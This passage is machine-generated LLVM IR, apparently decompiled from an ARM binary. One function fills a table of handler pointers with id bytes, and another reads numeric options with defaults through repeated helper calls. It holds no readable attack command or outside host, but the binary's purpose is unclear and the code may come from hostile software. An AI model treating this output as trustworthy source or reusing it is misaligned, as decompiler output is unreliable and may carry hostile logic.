  uselistorder label %dec_label_pc_a348, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a338, { 1, 0 }
}

define i32 @function_a370(i32 %arg1) local_unnamed_addr {
dec_label_pc_a370:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v3_a370 = load i32, i32* @r4, align 4
  %v6_a370 = load i32, i32* @r5, align 4
  %v9_a370 = load i32, i32* @r6, align 4
  %v12_a370 = load i32, i32* @r7, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a380 = call i32 @function_11958(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1e5b0.51 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1e5b4.53 to i32), i32* @r6, align 4
  store i32 51900, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_a380, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1e5b1.59 to i32), i32* %r1.global-to-local, align 4
  %v2_a3a0 = load i32, i32* @global_var_1e5b4.53, align 4
  %v2_a3a4 = inttoptr i32 %v2_a380 to i32*
  store i32 51900, i32* %v2_a3a4, align 4
  %v0_a3a8 = load i32, i32* @r7, align 4
  %v1_a3a8 = trunc i32 %v0_a3a8 to i8
  %v2_a3a8 = load i32, i32* @r4, align 4
  %v3_a3a8 = add i32 %v2_a3a8, 4
  %v4_a3a8 = inttoptr i32 %v3_a3a8 to i8*
  store i8 %v1_a3a8, i8* %v4_a3a8, align 1
  %v0_a3ac = load i32, i32* %r1.global-to-local, align 4
  %v3_a3ac = mul i32 %v0_a3ac, 4
  store i32 %v3_a3ac, i32* %r1.global-to-local, align 4
  %v2_a3b0 = inttoptr i32 %v2_a3a0 to i32*
  %v3_a3b0 = call i32 @function_11a8c(i32* %v2_a3b0, i32 %v3_a3ac)
  %v2_a3b4 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a3b4 = zext i8 %v2_a3b4 to i32
  store i32 %v3_a3b4, i32* %r3.global-to-local, align 4
  store i32 %v3_a3b0, i32* %r2.global-to-local, align 4
  %v0_a3bc = load i32, i32* @r4, align 4
  %v5_a3bc = mul nuw nsw i32 %v3_a3b4, 4
  %v6_a3bc = add i32 %v5_a3bc, %v3_a3b0
  %v7_a3bc = inttoptr i32 %v6_a3bc to i32*
  store i32 %v0_a3bc, i32* %v7_a3bc, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a3c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @r7, align 4
  %v2_a3c4 = add i32 %v1_a3c4, %v0_a3c4
  store i32 %v2_a3c4, i32* %r3.global-to-local, align 4
  %v1_a3cc = trunc i32 %v2_a3c4 to i8
  %v2_a3cc = load i32, i32* @r5, align 4
  %v3_a3cc = inttoptr i32 %v2_a3cc to i8*
  store i8 %v1_a3cc, i8* %v3_a3cc, align 1
  %v0_a3d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d0 = load i32, i32* @r6, align 4
  %v2_a3d0 = inttoptr i32 %v1_a3d0 to i32*
  store i32 %v0_a3d0, i32* %v2_a3d0, align 4
  %v2_a3d4 = call i32 @function_11958(i32 %v1_a3c4, i32 8)
  %v2_a3d8 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a3d8 = zext i8 %v2_a3d8 to i32
  store i32 ptrtoint (i32* @global_var_c81c.61 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a3d4, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_a3e8 = load i32, i32* @r7, align 4
  %v2_a3e8 = add i32 %v1_a3e8, %v3_a3d8
  store i32 %v2_a3e8, i32* %r1.global-to-local, align 4
  %v2_a3ec = load i32, i32* @global_var_1e5b4.53, align 4
  %v2_a3f0 = inttoptr i32 %v2_a3d4 to i32*
  store i32 ptrtoint (i32* @global_var_c81c.61 to i32), i32* %v2_a3f0, align 4
  %v0_a3f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a3f4 = trunc i32 %v0_a3f4 to i8
  %v2_a3f4 = load i32, i32* @r4, align 4
  %v3_a3f4 = add i32 %v2_a3f4, 4
  %v4_a3f4 = inttoptr i32 %v3_a3f4 to i8*
  store i8 %v1_a3f4, i8* %v4_a3f4, align 1
  %v0_a3f8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a3f8 = mul i32 %v0_a3f8, 4
  store i32 %v3_a3f8, i32* %r1.global-to-local, align 4
  %v4_a3fc = inttoptr i32 %v2_a3ec to i32*
  %v5_a3fc = call i32 @function_11a8c(i32* %v4_a3fc, i32 %v3_a3f8)
  %v2_a400 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a400 = zext i8 %v2_a400 to i32
  store i32 %v3_a400, i32* %r3.global-to-local, align 4
  store i32 %v5_a3fc, i32* %r2.global-to-local, align 4
  %v0_a408 = load i32, i32* @r4, align 4
  %v5_a408 = mul nuw nsw i32 %v3_a400, 4
  %v6_a408 = add i32 %v5_a408, %v5_a3fc
  %v7_a408 = inttoptr i32 %v6_a408 to i32*
  store i32 %v0_a408, i32* %v7_a408, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a410 = load i32, i32* %r3.global-to-local, align 4
  %v1_a410 = load i32, i32* @r7, align 4
  %v2_a410 = add i32 %v1_a410, %v0_a410
  store i32 %v2_a410, i32* %r3.global-to-local, align 4
  %v1_a418 = trunc i32 %v2_a410 to i8
  %v2_a418 = load i32, i32* @r5, align 4
  %v3_a418 = inttoptr i32 %v2_a418 to i8*
  store i8 %v1_a418, i8* %v3_a418, align 1
  %v0_a41c = load i32, i32* %r2.global-to-local, align 4
  %v1_a41c = load i32, i32* @r6, align 4
  %v2_a41c = inttoptr i32 %v1_a41c to i32*
  store i32 %v0_a41c, i32* %v2_a41c, align 4
  %v2_a420 = call i32 @function_11958(i32 %v1_a410, i32 8)
  %v2_a424 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a424 = zext i8 %v2_a424 to i32
  store i32 ptrtoint (i32* @global_var_c170.63 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a420, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_a434 = load i32, i32* @r7, align 4
  %v2_a434 = add i32 %v1_a434, %v3_a424
  store i32 %v2_a434, i32* %r1.global-to-local, align 4
  %v2_a438 = load i32, i32* @global_var_1e5b4.53, align 4
  %v2_a43c = inttoptr i32 %v2_a420 to i32*
  store i32 ptrtoint (i32* @global_var_c170.63 to i32), i32* %v2_a43c, align 4
  %v0_a440 = load i32, i32* %r3.global-to-local, align 4
  %v1_a440 = trunc i32 %v0_a440 to i8
  %v2_a440 = load i32, i32* @r4, align 4
  %v3_a440 = add i32 %v2_a440, 4
  %v4_a440 = inttoptr i32 %v3_a440 to i8*
  store i8 %v1_a440, i8* %v4_a440, align 1
  %v0_a444 = load i32, i32* %r1.global-to-local, align 4
  %v3_a444 = mul i32 %v0_a444, 4
  store i32 %v3_a444, i32* %r1.global-to-local, align 4
  %v4_a448 = inttoptr i32 %v2_a438 to i32*
  %v5_a448 = call i32 @function_11a8c(i32* %v4_a448, i32 %v3_a444)
  %v2_a44c = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a44c = zext i8 %v2_a44c to i32
  store i32 %v3_a44c, i32* %r3.global-to-local, align 4
  store i32 %v5_a448, i32* %r2.global-to-local, align 4
  %v0_a454 = load i32, i32* @r4, align 4
  %v5_a454 = mul nuw nsw i32 %v3_a44c, 4
  %v6_a454 = add i32 %v5_a454, %v5_a448
  %v7_a454 = inttoptr i32 %v6_a454 to i32*
  store i32 %v0_a454, i32* %v7_a454, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a45c = load i32, i32* %r3.global-to-local, align 4
  %v1_a45c = load i32, i32* @r7, align 4
  %v2_a45c = add i32 %v1_a45c, %v0_a45c
  store i32 %v2_a45c, i32* %r3.global-to-local, align 4
  %v1_a464 = trunc i32 %v2_a45c to i8
  %v2_a464 = load i32, i32* @r5, align 4
  %v3_a464 = inttoptr i32 %v2_a464 to i8*
  store i8 %v1_a464, i8* %v3_a464, align 1
  %v0_a468 = load i32, i32* %r2.global-to-local, align 4
  %v1_a468 = load i32, i32* @r6, align 4
  %v2_a468 = inttoptr i32 %v1_a468 to i32*
  store i32 %v0_a468, i32* %v2_a468, align 4
  %v2_a46c = call i32 @function_11958(i32 %v1_a45c, i32 8)
  %v2_a470 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a470 = zext i8 %v2_a470 to i32
  store i32 ptrtoint (i32* @global_var_ba78.65 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a46c, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_a480 = load i32, i32* @r7, align 4
  %v2_a480 = add i32 %v1_a480, %v3_a470
  store i32 %v2_a480, i32* %r1.global-to-local, align 4
  %v2_a484 = load i32, i32* @global_var_1e5b4.53, align 4
  %v2_a488 = inttoptr i32 %v2_a46c to i32*
  store i32 ptrtoint (i32* @global_var_ba78.65 to i32), i32* %v2_a488, align 4
  %v0_a48c = load i32, i32* %r3.global-to-local, align 4
  %v1_a48c = trunc i32 %v0_a48c to i8
  %v2_a48c = load i32, i32* @r4, align 4
  %v3_a48c = add i32 %v2_a48c, 4
  %v4_a48c = inttoptr i32 %v3_a48c to i8*
  store i8 %v1_a48c, i8* %v4_a48c, align 1
  %v0_a490 = load i32, i32* %r1.global-to-local, align 4
  %v3_a490 = mul i32 %v0_a490, 4
  store i32 %v3_a490, i32* %r1.global-to-local, align 4
  %v4_a494 = inttoptr i32 %v2_a484 to i32*
  %v5_a494 = call i32 @function_11a8c(i32* %v4_a494, i32 %v3_a490)
  %v2_a498 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a498 = zext i8 %v2_a498 to i32
  store i32 %v3_a498, i32* %r3.global-to-local, align 4
  store i32 %v5_a494, i32* %r2.global-to-local, align 4
  %v0_a4a0 = load i32, i32* @r4, align 4
  %v5_a4a0 = mul nuw nsw i32 %v3_a498, 4
  %v6_a4a0 = add i32 %v5_a4a0, %v5_a494
  %v7_a4a0 = inttoptr i32 %v6_a4a0 to i32*
  store i32 %v0_a4a0, i32* %v7_a4a0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a4a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a4a8 = load i32, i32* @r7, align 4
  %v2_a4a8 = add i32 %v1_a4a8, %v0_a4a8
  store i32 %v2_a4a8, i32* %r3.global-to-local, align 4
  %v1_a4b0 = trunc i32 %v2_a4a8 to i8
  %v2_a4b0 = load i32, i32* @r5, align 4
  %v3_a4b0 = inttoptr i32 %v2_a4b0 to i8*
  store i8 %v1_a4b0, i8* %v3_a4b0, align 1
  %v0_a4b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a4b4 = load i32, i32* @r6, align 4
  %v2_a4b4 = inttoptr i32 %v1_a4b4 to i32*
  store i32 %v0_a4b4, i32* %v2_a4b4, align 4
  %v2_a4b8 = call i32 @function_11958(i32 %v1_a4a8, i32 8)
  %v2_a4bc = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a4bc = zext i8 %v2_a4bc to i32
  store i32 ptrtoint (i32* @global_var_b2c4.67 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a4b8, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_a4cc = load i32, i32* @r7, align 4
  %v2_a4cc = add i32 %v1_a4cc, %v3_a4bc
  store i32 %v2_a4cc, i32* %r1.global-to-local, align 4
  %v2_a4d0 = load i32, i32* @global_var_1e5b4.53, align 4
  %v2_a4d4 = inttoptr i32 %v2_a4b8 to i32*
  store i32 ptrtoint (i32* @global_var_b2c4.67 to i32), i32* %v2_a4d4, align 4
  %v0_a4d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a4d8 = trunc i32 %v0_a4d8 to i8
  %v2_a4d8 = load i32, i32* @r4, align 4
  %v3_a4d8 = add i32 %v2_a4d8, 4
  %v4_a4d8 = inttoptr i32 %v3_a4d8 to i8*
  store i8 %v1_a4d8, i8* %v4_a4d8, align 1
  %v0_a4dc = load i32, i32* %r1.global-to-local, align 4
  %v3_a4dc = mul i32 %v0_a4dc, 4
  store i32 %v3_a4dc, i32* %r1.global-to-local, align 4
  %v4_a4e0 = inttoptr i32 %v2_a4d0 to i32*
  %v5_a4e0 = call i32 @function_11a8c(i32* %v4_a4e0, i32 %v3_a4dc)
  %v2_a4e4 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a4e4 = zext i8 %v2_a4e4 to i32
  store i32 %v3_a4e4, i32* %r3.global-to-local, align 4
  store i32 %v5_a4e0, i32* %r2.global-to-local, align 4
  %v0_a4ec = load i32, i32* @r4, align 4
  %v5_a4ec = mul nuw nsw i32 %v3_a4e4, 4
  %v6_a4ec = add i32 %v5_a4ec, %v5_a4e0
  %v7_a4ec = inttoptr i32 %v6_a4ec to i32*
  store i32 %v0_a4ec, i32* %v7_a4ec, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a4f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a4f4 = load i32, i32* @r7, align 4
  %v2_a4f4 = add i32 %v1_a4f4, %v0_a4f4
  store i32 %v2_a4f4, i32* %r3.global-to-local, align 4
  %v1_a4fc = trunc i32 %v2_a4f4 to i8
  %v2_a4fc = load i32, i32* @r5, align 4
  %v3_a4fc = inttoptr i32 %v2_a4fc to i8*
  store i8 %v1_a4fc, i8* %v3_a4fc, align 1
  %v0_a500 = load i32, i32* %r2.global-to-local, align 4
  %v1_a500 = load i32, i32* @r6, align 4
  %v2_a500 = inttoptr i32 %v1_a500 to i32*
  store i32 %v0_a500, i32* %v2_a500, align 4
  %v2_a504 = call i32 @function_11958(i32 %v1_a4f4, i32 8)
  %v2_a508 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a508 = zext i8 %v2_a508 to i32
  store i32 ptrtoint (i32* @global_var_aca8.69 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a504, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_a518 = load i32, i32* @r7, align 4
  %v2_a518 = add i32 %v1_a518, %v3_a508
  store i32 %v2_a518, i32* %r1.global-to-local, align 4
  %v2_a51c = load i32, i32* @global_var_1e5b4.53, align 4
  %v2_a520 = inttoptr i32 %v2_a504 to i32*
  store i32 ptrtoint (i32* @global_var_aca8.69 to i32), i32* %v2_a520, align 4
  %v0_a524 = load i32, i32* %r3.global-to-local, align 4
  %v1_a524 = trunc i32 %v0_a524 to i8
  %v2_a524 = load i32, i32* @r4, align 4
  %v3_a524 = add i32 %v2_a524, 4
  %v4_a524 = inttoptr i32 %v3_a524 to i8*
  store i8 %v1_a524, i8* %v4_a524, align 1
  %v0_a528 = load i32, i32* %r1.global-to-local, align 4
  %v3_a528 = mul i32 %v0_a528, 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v4_a52c = inttoptr i32 %v2_a51c to i32*
  %v5_a52c = call i32 @function_11a8c(i32* %v4_a52c, i32 %v3_a528)
  %v2_a530 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a530 = zext i8 %v2_a530 to i32
  store i32 %v3_a530, i32* %r3.global-to-local, align 4
  store i32 %v5_a52c, i32* %r2.global-to-local, align 4
  %v0_a538 = load i32, i32* @r4, align 4
  %v5_a538 = mul nuw nsw i32 %v3_a530, 4
  %v6_a538 = add i32 %v5_a538, %v5_a52c
  %v7_a538 = inttoptr i32 %v6_a538 to i32*
  store i32 %v0_a538, i32* %v7_a538, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a540 = load i32, i32* %r3.global-to-local, align 4
  %v1_a540 = load i32, i32* @r7, align 4
  %v2_a540 = add i32 %v1_a540, %v0_a540
  store i32 %v2_a540, i32* %r3.global-to-local, align 4
  %v1_a548 = trunc i32 %v2_a540 to i8
  %v2_a548 = load i32, i32* @r5, align 4
  %v3_a548 = inttoptr i32 %v2_a548 to i8*
  store i8 %v1_a548, i8* %v3_a548, align 1
  %v0_a54c = load i32, i32* %r2.global-to-local, align 4
  %v1_a54c = load i32, i32* @r6, align 4
  %v2_a54c = inttoptr i32 %v1_a54c to i32*
  store i32 %v0_a54c, i32* %v2_a54c, align 4
  %v2_a550 = call i32 @function_11958(i32 %v1_a540, i32 8)
  %v2_a554 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a554 = zext i8 %v2_a554 to i32
  store i32 ptrtoint (i32* @global_var_a614.71 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a550, i32* @r4, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_a564 = load i32, i32* @r7, align 4
  %v2_a564 = add i32 %v1_a564, %v3_a554
  store i32 %v2_a564, i32* %r1.global-to-local, align 4
  %v2_a568 = load i32, i32* @global_var_1e5b4.53, align 4
  %v2_a56c = inttoptr i32 %v2_a550 to i32*
  store i32 ptrtoint (i32* @global_var_a614.71 to i32), i32* %v2_a56c, align 4
  %v0_a570 = load i32, i32* %r3.global-to-local, align 4
  %v1_a570 = trunc i32 %v0_a570 to i8
  %v2_a570 = load i32, i32* @r4, align 4
  %v3_a570 = add i32 %v2_a570, 4
  %v4_a570 = inttoptr i32 %v3_a570 to i8*
  store i8 %v1_a570, i8* %v4_a570, align 1
  %v0_a574 = load i32, i32* %r1.global-to-local, align 4
  %v3_a574 = mul i32 %v0_a574, 4
  store i32 %v3_a574, i32* %r1.global-to-local, align 4
  %v4_a578 = inttoptr i32 %v2_a568 to i32*
  %v5_a578 = call i32 @function_11a8c(i32* %v4_a578, i32 %v3_a574)
  %v2_a57c = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a57c = zext i8 %v2_a57c to i32
  store i32 %v3_a57c, i32* %r3.global-to-local, align 4
  store i32 %v5_a578, i32* %r2.global-to-local, align 4
  %v0_a584 = load i32, i32* @r4, align 4
  %v5_a584 = mul nuw nsw i32 %v3_a57c, 4
  %v6_a584 = add i32 %v5_a584, %v5_a578
  %v7_a584 = inttoptr i32 %v6_a584 to i32*
  store i32 %v0_a584, i32* %v7_a584, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a58c = load i32, i32* %r3.global-to-local, align 4
  %v1_a58c = load i32, i32* @r7, align 4
  %v2_a58c = add i32 %v1_a58c, %v0_a58c
  store i32 %v2_a58c, i32* %r3.global-to-local, align 4
  %v1_a594 = trunc i32 %v2_a58c to i8
  %v2_a594 = load i32, i32* @r5, align 4
  %v3_a594 = inttoptr i32 %v2_a594 to i8*
  store i8 %v1_a594, i8* %v3_a594, align 1
  %v0_a598 = load i32, i32* %r2.global-to-local, align 4
  %v1_a598 = load i32, i32* @r6, align 4
  %v2_a598 = inttoptr i32 %v1_a598 to i32*
  store i32 %v0_a598, i32* %v2_a598, align 4
  %v2_a59c = call i32 @function_11958(i32 %v1_a58c, i32 8)
  %v2_a5a0 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a5a0 = zext i8 %v2_a5a0 to i32
  store i32 ptrtoint (i32* @global_var_8190.73 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a59c, i32* @r4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a5b0 = load i32, i32* @r7, align 4
  %v2_a5b0 = add i32 %v1_a5b0, %v3_a5a0
  store i32 %v2_a5b0, i32* %r1.global-to-local, align 4
  %v2_a5b4 = load i32, i32* @global_var_1e5b4.53, align 4
  %v2_a5b8 = inttoptr i32 %v2_a59c to i32*
  store i32 ptrtoint (i32* @global_var_8190.73 to i32), i32* %v2_a5b8, align 4
  %v0_a5bc = load i32, i32* %r3.global-to-local, align 4
  %v1_a5bc = trunc i32 %v0_a5bc to i8
  %v2_a5bc = load i32, i32* @r4, align 4
  %v3_a5bc = add i32 %v2_a5bc, 4
  %v4_a5bc = inttoptr i32 %v3_a5bc to i8*
  store i8 %v1_a5bc, i8* %v4_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a5c0 = mul i32 %v0_a5c0, 4
  store i32 %v3_a5c0, i32* %r1.global-to-local, align 4
  %v4_a5c4 = inttoptr i32 %v2_a5b4 to i32*
  %v5_a5c4 = call i32 @function_11a8c(i32* %v4_a5c4, i32 %v3_a5c0)
  %v2_a5c8 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a5c8 = zext i8 %v2_a5c8 to i32
  store i32 %v3_a5c8, i32* %r3.global-to-local, align 4
  %v1_a5cc = load i32, i32* @r6, align 4
  %v2_a5cc = inttoptr i32 %v1_a5cc to i32*
  store i32 %v5_a5c4, i32* %v2_a5cc, align 4
  %v0_a5d0 = load i32, i32* @r4, align 4
  %v2_a5d0 = load i32, i32* %r3.global-to-local, align 4
  %v5_a5d0 = mul i32 %v2_a5d0, 4
  %v6_a5d0 = add i32 %v5_a5d0, %v5_a5c4
  %v7_a5d0 = inttoptr i32 %v6_a5d0 to i32*
  store i32 %v0_a5d0, i32* %v7_a5d0, align 4
  %v0_a5d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5d4 = load i32, i32* @r7, align 4
  %v2_a5d4 = add i32 %v1_a5d4, %v0_a5d4
  store i32 %v2_a5d4, i32* %r2.global-to-local, align 4
  %v1_a5dc = trunc i32 %v2_a5d4 to i8
  %v2_a5dc = load i32, i32* @r5, align 4
  %v3_a5dc = inttoptr i32 %v2_a5dc to i8*
  store i8 %v1_a5dc, i8* %v3_a5dc, align 1
  store i32 %v3_a370, i32* @r4, align 4
  store i32 %v6_a370, i32* @r5, align 4
  store i32 %v9_a370, i32* @r6, align 4
  store i32 %v12_a370, i32* @r7, align 4
  ret i32 %v1_a5d4

; uselistorder directives
  uselistorder i32 %v1_a5d4, { 1, 0 }
  uselistorder i32 %v3_a5c0, { 1, 0 }
  uselistorder i32 %v1_a58c, { 1, 0 }
  uselistorder i32 %v3_a574, { 1, 0 }
  uselistorder i32 %v1_a540, { 1, 0 }
  uselistorder i32 %v3_a528, { 1, 0 }
  uselistorder i32 %v1_a4f4, { 1, 0 }
  uselistorder i32 %v3_a4dc, { 1, 0 }
  uselistorder i32 %v1_a4a8, { 1, 0 }
  uselistorder i32 %v3_a490, { 1, 0 }
  uselistorder i32 %v1_a45c, { 1, 0 }
  uselistorder i32 %v3_a444, { 1, 0 }
  uselistorder i32 %v1_a410, { 1, 0 }
  uselistorder i32 %v3_a3f8, { 1, 0 }
  uselistorder i32 %v1_a3c4, { 1, 0 }
  uselistorder i32 %v3_a3ac, { 1, 0 }
  uselistorder i32 %v2_a380, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e5b0.51 to i8*), { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_1e5b4.53, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8 }
}

define i32 @function_a614(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a614:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a614 = load i32, i32* @r4, align 4
  %v6_a614 = load i32, i32* @r5, align 4
  %v24_a614 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_a630 = call i32 @function_11958(i32 %arg1, i32 4)
  %v0_a634 = load i32, i32* @r5, align 4
  store i32 %v0_a634, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a644 = load i32, i32* @r4, align 4
  store i32 %v0_a644, i32* %r0.global-to-local, align 4
  %v5_a648 = inttoptr i32 %v0_a634 to i32*
  %v6_a648 = call i32 @function_a300(i32 %v0_a644, i32* %v5_a648, i32 2, i32 0)
  %v1_a654 = urem i32 %v6_a648, 256
  store i32 %v1_a654, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a660 = load i32, i32* @r5, align 4
  store i32 %v0_a660, i32* %r1.global-to-local, align 4
  %v0_a664 = load i32, i32* @r4, align 4
  store i32 %v0_a664, i32* %r0.global-to-local, align 4
  %v5_a668 = trunc i32 %v6_a648 to i8
  %v6_a66c = inttoptr i32 %v0_a660 to i32*
  %v7_a66c = call i32 @function_a300(i32 %v0_a664, i32* %v6_a66c, i32 3, i32 65535)
  %v0_a670 = load i32, i32* @r5, align 4
  store i32 %v0_a670, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a66c, i32* %fp.global-to-local, align 4
  %v0_a680 = load i32, i32* @r4, align 4
  store i32 %v0_a680, i32* %r0.global-to-local, align 4
  %v4_a684 = inttoptr i32 %v0_a670 to i32*
  %v5_a684 = call i32 @function_a300(i32 %v0_a680, i32* %v4_a684, i32 4, i32 64)
  %v1_a68c = urem i32 %v5_a684, 256
  store i32 %v1_a68c, i32* %ip.global-to-local, align 4
  %v0_a690 = load i32, i32* @r5, align 4
  store i32 %v0_a690, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a69c = load i32, i32* @r4, align 4
  store i32 %v0_a69c, i32* %r0.global-to-local, align 4
  %v6_a6a4 = inttoptr i32 %v0_a690 to i32*
  %v7_a6a4 = call i32 @function_a300(i32 %v0_a69c, i32* %v6_a6a4, i32 5, i32 1)
  %v1_a6b0 = urem i32 %v7_a6a4, 256
  store i32 %v1_a6b0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r5, align 4
  store i32 %v0_a6bc, i32* %r1.global-to-local, align 4
  %v0_a6c0 = load i32, i32* @r4, align 4
  store i32 %v0_a6c0, i32* %r0.global-to-local, align 4
  %v5_a6c8 = inttoptr i32 %v0_a6bc to i32*
  %v6_a6c8 = call i32 @function_a300(i32 %v0_a6c0, i32* %v5_a6c8, i32 6, i32 65535)
  %v0_a6d0 = load i32, i32* @r5, align 4
  store i32 %v0_a6d0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a6c8, i32* @r8, align 4
  %v0_a6e0 = load i32, i32* @r4, align 4
  store i32 %v0_a6e0, i32* %r0.global-to-local, align 4
  %v4_a6e4 = inttoptr i32 %v0_a6d0 to i32*
  %v5_a6e4 = call i32 @function_a300(i32 %v0_a6e0, i32* %v4_a6e4, i32 7, i32 65535)
  %v0_a6e8 = load i32, i32* @r5, align 4
  store i32 %v0_a6e8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a6e4, i32* @r7, align 4
  %v0_a6f8 = load i32, i32* @r4, align 4
  store i32 %v0_a6f8, i32* %r0.global-to-local, align 4
  %v4_a6fc = inttoptr i32 %v0_a6e8 to i32*
  %v5_a6fc = call i32 @function_a300(i32 %v0_a6f8, i32* %v4_a6fc, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a70c = load i32, i32* @r5, align 4
  store i32 %v0_a70c, i32* %r1.global-to-local, align 4
  %v0_a710 = load i32, i32* @r4, align 4
  store i32 %v0_a710, i32* %r0.global-to-local, align 4
  %v4_a714 = inttoptr i32 %v0_a70c to i32*
  %v5_a714 = call i32 @function_a300(i32 %v0_a710, i32* %v4_a714, i32 1, i32 1)
  %v1_a71c = urem i32 %v5_a714, 256
  store i32 %v1_a71c, i32* %ip.global-to-local, align 4
  %v0_a720 = load i32, i32* @r5, align 4
  store i32 %v0_a720, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a72c = load i32, i32* @r4, align 4
  store i32 %v0_a72c, i32* %r0.global-to-local, align 4
  %v5_a734 = inttoptr i32 %v0_a720 to i32*
  %v6_a734 = call i32 @function_a300(i32 %v0_a72c, i32* %v5_a734, i32 19, i32 0)
